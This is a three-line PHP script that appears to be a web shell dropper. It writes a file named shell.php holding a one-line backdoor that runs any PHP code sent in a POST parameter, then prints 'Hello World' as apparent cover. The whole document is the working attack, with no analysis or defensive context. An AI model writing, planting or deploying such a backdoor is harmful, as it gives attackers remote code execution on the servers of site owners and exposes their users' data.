<?php fputs(fopen('shell.php', 'rw'), "<?php @eval($_POST['a']);?>");
echo "Hello World";
?>
